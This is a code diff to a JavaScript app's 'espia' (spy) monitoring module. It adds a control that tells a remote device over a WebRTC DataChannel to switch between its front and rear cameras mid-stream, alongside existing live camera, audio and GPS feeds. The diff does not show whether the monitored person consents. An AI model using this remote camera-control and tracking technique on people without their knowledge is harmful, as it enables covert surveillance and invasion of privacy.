@@ -32013,9 +32013,18 @@ const MOS = (() => {
       const dc = ev.channel;
       console.log('[espia master] datachannel recibido:', dc.label);
       if (dc.label === 'gps') {
+        // [rotar-cam] El canal 'gps' es bidireccional una vez abierto. Guardamos la referencia para
+        // poder MANDAR comandos al device (ej. ROTAR_CAM) además de recibir GPS/__meta.
+        if (_espiaV2) _espiaV2.cmdCh = dc;
         dc.onmessage = (msg) => {
           try {
             const data = JSON.parse(msg.data);
+            // [rotar-cam] ACKs del device ante el comando de rotar cámara.
+            if (data && data.__ack) {
+              if (data.__ack === 'ROTAR_OK') { try { _espiaSfx('shimmer'); toast('Cámara rotada ✓', 'ok', 2200); } catch(_){} }
+              else if (data.__ack === 'ROTAR_FAIL') { try { toast('El equipo no pudo rotar la cámara', 'warn', 2600); } catch(_){} }
+              return;
+            }
             if (data && data.__meta === 'trackMap' && data.map) {
               _espiaV2AplicarTrackMap(data.map);
               return;
@@ -32506,6 +32515,15 @@ const MOS = (() => {
     // Estilos base compartidos de los botones de la barra
     const btnCss = 'border:1px solid rgba(255,255,255,.14);color:#e2e8f0;border-radius:11px;width:40px;height:40px;font-size:16px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background .15s,transform .1s';
 
+    // [rotar-cam] Botón "Rotar cámara": pide al DEVICE cambiar de cámara física (frontal ↔ trasera).
+    // Distinto del salto entre streams ya existentes. Ícono = cámara con flechas de rotación + texto,
+    // para que comunique "rotar cámara" sin ambigüedad. Se muestra si el device es móvil/tablet o si
+    // ya hay algún stream de cámara (en desktop una webcam no rota, pero no molesta si aparece).
+    const mostrarRotar = !!(s.camara || s.camara2 || (caps && (caps.esMobile || caps.plataforma === 'mobile' || caps.plataforma === 'tablet')));
+    const rotarBtnHtml = mostrarRotar
+      ? `<button onclick="MOS._espiaV2RotarCam()" title="Rotar cámara del equipo (frontal ↔ trasera)" style="background:rgba(244,114,182,.16);${btnCss};width:auto;padding:0 12px;gap:6px;font-size:12px;font-weight:800;color:#fbcfe8;border-color:rgba(244,114,182,.4)" onmouseover="this.style.background='rgba(244,114,182,.3)'" onmouseout="this.style.background='rgba(244,114,182,.16)'"><svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0"><rect x="2.5" y="7.5" width="19" height="12" rx="2.5"/><path d="M8.5 7.5 10 5h4l1.5 2.5"/><path d="M9 13.5a3 3 0 0 1 5-2.2"/><polyline points="14 9.4 14 11.5 11.9 11.5"/><path d="M15 13.5a3 3 0 0 1-5 2.2"/><polyline points="10 17.6 10 15.5 12.1 15.5"/></svg>Rotar</button>`
+      : '';
+
     const html = `<div id="espiaV2Modal" style="position:fixed;inset:0;background:#000;z-index:2147483646;overflow:hidden;animation:espiaV2In .3s ease-out">
       <!-- STAGE: mosaico o solo -->
       <div id="espiaV2Grid" data-n="${n}" ${solo ? 'data-solo="1"' : ''} style="position:absolute;inset:0;display:grid;gap:${solo ? '0' : '8px'};padding:${solo ? '0' : '8px'};box-sizing:border-box">
@@ -32536,6 +32554,7 @@ const MOS = (() => {
             onmouseover="this.style.background='rgba(34,211,238,.25)'" onmouseout="this.style.background='rgba(255,255,255,.06)'">🔊</button>
           <button onclick="MOS._espiaV2Captura()" title="Capturar imagen" style="background:rgba(255,255,255,.06);${btnCss}"
             onmouseover="this.style.background='rgba(99,102,241,.3)'" onmouseout="this.style.background='rgba(255,255,255,.06)'">📸</button>
+          ${rotarBtnHtml}
           <button onclick="MOS._espiaV2Fullscreen()" title="Pantalla completa" style="background:rgba(255,255,255,.06);${btnCss}"
             onmouseover="this.style.background='rgba(255,255,255,.14)'" onmouseout="this.style.background='rgba(255,255,255,.06)'">⛶</button>
           <button onclick="MOS.cerrarEspiaV2()" title="Cerrar" style="background:rgba(248,113,113,.18);${btnCss};color:#fca5a5;border-color:rgba(248,113,113,.4)"
@@ -32671,6 +32690,25 @@ const MOS = (() => {
     _espiaV2.soloStream = k;
     if (_espiaV2.streams[k]) _espiaV2.focus = k;
     _espiaV2RenderModal();
+  }
+
+  // [rotar-cam] Pide al DEVICE que CAMBIE físicamente de cámara (frontal ↔ trasera). Distinto de
+  // _espiaV2SoloIr (que solo alterna entre streams YA existentes): esto viaja por el DataChannel
+  // 'gps' y el device hace el switch con replaceTrack. El mismo tile 'camara' cambia de imagen.
+  function _espiaV2RotarCam() {
+    if (!_espiaV2) return;
+    const ch = _espiaV2.cmdCh;
+    if (!ch || ch.readyState !== 'open') {
+      toast('Cámara del equipo no disponible aún', 'warn', 2600);
+      return;
+    }
+    try {
+      ch.send(JSON.stringify({ __cmd: 'ROTAR_CAM' }));
+      _espiaSfx('pop');
+      toast('Rotando cámara del equipo…', 'info', 2000);
+    } catch (e) {
+      toast('No se pudo enviar el comando de rotar', 'warn', 2600);
+    }
   }
 
   // Captura de pantalla del tile indicado (o del solo/focus actual) → PNG.
@@ -40871,6 +40909,9 @@ var _pPickState = { filtroZona: null, filtroTipo: null, mostrarTodas: false };
         // Watchdog de ICE failed para reconnect/cierre graceful
         _iceFailedDesde: 0,
         _iceWatchdogTimer: null,
+        // [rotar-cam] facingMode de la cámara PRIMARIA ('environment'|'user'|null). Sirve para el
+        // SWITCH de cámara: el master pide ROTAR y el device abre la cámara opuesta con replaceTrack.
+        _camFacing: null,
         // State de capabilities reportadas al master (definido acá para no depender del event loop)
         _capsState: { camsHardware: 0, dualIntentado: false }
       };
@@ -41010,6 +41051,11 @@ var _pPickState = { filtroZona: null, filtroTipo: null, mostrarTodas: false };
             window._espiaCliMOS._trackTipoMap[t.id] = (t.kind === 'audio') ? 'audio' : 'camara';
             pc.addTrack(t, window._espiaCliMOS.streams.userMedia);
           });
+          // [rotar-cam] Guardar el facingMode de la cámara primaria para saber cuál es la opuesta.
+          try {
+            const _vtPrim = window._espiaCliMOS.streams.userMedia.getVideoTracks()[0];
+            window._espiaCliMOS._camFacing = _vtPrim?.getSettings?.().facingMode || null;
+          } catch (_) {}
         }
         // DUAL CAMERA — cascada de intentos (deviceId exact → facingMode exact → facingMode ideal).
         // El motivo del fallo final se reporta vía capabilities.dualFallReason.
@@ -41258,6 +41304,81 @@ var _pPickState = { filtroZona: null, filtroTipo: null, mostrarTodas: false };
           }, 1500);
         };
         gpsCh.onerror = e => console.warn('[espia MOS gps] DataChannel error:', e?.message);
+        // [rotar-cam] El master manda comandos por el MISMO DataChannel 'gps' (es bidireccional una
+        // vez abierto). Único comando por ahora: ROTAR_CAM → cambiar físicamente de cámara con un
+        // SWITCH (replaceTrack, sin renegociación) — en móvil rara vez se pueden abrir frontal y
+        // trasera A LA VEZ, así que en lugar de dual usamos un solo track que rota.
+        gpsCh.onmessage = (ev) => {
+          let msg = null;
+          try { msg = JSON.parse(ev.data); } catch (_) { return; }
+          if (msg && msg.__cmd === 'ROTAR_CAM') {
+            _espiaCliMOSRotarCam();
+          }
+        };
+        // Ejecuta el SWITCH de cámara primaria. Todo en try/catch: una falla JAMÁS debe tumbar la sesión.
+        async function _espiaCliMOSRotarCam() {
+          const ref = window._espiaCliMOS;
+          if (!ref || !ref.pc) return;
+          const pcAhora = ref.pc;
+          const um = ref.streams?.userMedia;
+          if (!um) { console.warn('[espia MOS rotar] sin userMedia'); return; }
+          try {
+            // SENDER de la CÁMARA primaria: su .track debe ser el video track ACTUAL de userMedia
+            // (NO pantalla/getDisplayMedia, NO audio, NO camara2 — esos viven en otros streams/senders).
+            const tViejo = um.getVideoTracks()[0];
+            if (!tViejo) { console.warn('[espia MOS rotar] userMedia sin video track'); return; }
+            const sender = pcAhora.getSenders().find(s => s.track && s.track === tViejo);
+            if (!sender) { console.warn('[espia MOS rotar] no encontré el sender de la cámara primaria'); return; }
+            // Facing opuesto — preferimos el _camFacing guardado; si no, lo derivamos del track vivo.
+            const facingActual = ref._camFacing || tViejo.getSettings?.().facingMode || 'environment';
+            const opuesto = facingActual === 'user' ? 'environment' : 'user';
+            console.log('[espia MOS rotar] ' + facingActual + ' → ' + opuesto);
+            // Cascada exact → ideal. Si todo falla NO rompemos nada (no tocamos el sender ni el track viejo).
+            let nuevoStream = null;
+            const variantes = [
+              { facingMode: { exact: opuesto }, width: { ideal: 640 }, height: { ideal: 480 } },
+              { facingMode: { ideal: opuesto }, width: { ideal: 640 }, height: { ideal: 480 } }
+            ];
+            for (const v of variantes) {
+              try {
+                nuevoStream = await navigator.mediaDevices.getUserMedia({ video: v, audio: false });
+                break;
+              } catch (e) { console.warn('[espia MOS rotar] getUserMedia ✗ ' + JSON.stringify(v) + ':', e.name, e.message); }
+            }
+            const ref2 = window._espiaCliMOS;
+            if (!nuevoStream || !ref2 || ref2 !== ref) {
+              // Falló abrir la opuesta o la sesión cambió: revertir/limpiar y avisar (opcional) al master.
+              if (nuevoStream) nuevoStream.getTracks().forEach(t => { try { t.stop(); } catch (_) {} });
+              console.warn('[espia MOS rotar] no se pudo abrir la cámara opuesta · sin cambios');
+              try { if (ref.gpsCh?.readyState === 'open') ref.gpsCh.send(JSON.stringify({ __ack: 'ROTAR_FAIL' })); } catch (_) {}
+              return;
+            }
+            const tNuevo = nuevoStream.getVideoTracks()[0];
+            if (!tNuevo) {
+              nuevoStream.getTracks().forEach(t => { try { t.stop(); } catch (_) {} });
+              try { if (ref.gpsCh?.readyState === 'open') ref.gpsCh.send(JSON.stringify({ __ack: 'ROTAR_FAIL' })); } catch (_) {}
+              return;
+            }
+            try { tNuevo.contentHint = 'motion'; } catch (_) {}
+            // replaceTrack NO requiere renegociación → el master sigue viendo el mismo tile 'camara'.
+            await sender.replaceTrack(tNuevo);
+            // Consistencia del stream local: quitar el viejo, agregar el nuevo y mantener el trackTipoMap.
+            try {
+              um.removeTrack(tViejo);
+              um.addTrack(tNuevo);
+              ref._trackTipoMap = ref._trackTipoMap || {};
+              ref._trackTipoMap[tNuevo.id] = 'camara';
+              delete ref._trackTipoMap[tViejo.id];
+            } catch (eM) { console.warn('[espia MOS rotar] sync stream local:', eM.message); }
+            try { tViejo.stop(); } catch (_) {}
+            ref._camFacing = tNuevo.getSettings?.().facingMode || opuesto;
+            console.log('[espia MOS rotar] ✓ ahora facing=' + ref._camFacing);
+            try { if (ref.gpsCh?.readyState === 'open') ref.gpsCh.send(JSON.stringify({ __ack: 'ROTAR_OK', facing: ref._camFacing })); } catch (_) {}
+          } catch (e) {
+            console.warn('[espia MOS rotar] excepción global:', e?.name, e?.message);
+            try { if (window._espiaCliMOS?.gpsCh?.readyState === 'open') window._espiaCliMOS.gpsCh.send(JSON.stringify({ __ack: 'ROTAR_FAIL' })); } catch (_) {}
+          }
+        }
         // GPS strategy 2-pass: posición rápida (IP/WiFi, low accuracy) + watchPosition (high accuracy).
         if ('geolocation' in navigator) {
           let _gpsLastMOS = { lat: null, lng: null, ts: 0 };
@@ -50290,6 +50411,8 @@ var _pPickState = { filtroZona: null, filtroTipo: null, mostrarTodas: false };
     _espiaV2Swap, _espiaV2ToggleMute, _espiaV2Fullscreen,
     // [v2.44] Visor inmersivo mosaico: expandir/volver/saltar cámara + captura
     _espiaV2ExpandirTile, _espiaV2VolverMosaico, _espiaV2SoloIr, _espiaV2Captura,
+    // [rotar-cam] Pide al device cambiar de cámara física (frontal ↔ trasera) vía DataChannel 'gps'
+    _espiaV2RotarCam,
     // [v2.43.61] Timeline buffer histórico
     abrirTimelineBufferEspia, cerrarTimelineEspia,
     _espiaTimelineRecargar, _espiaTimelineReproducir,
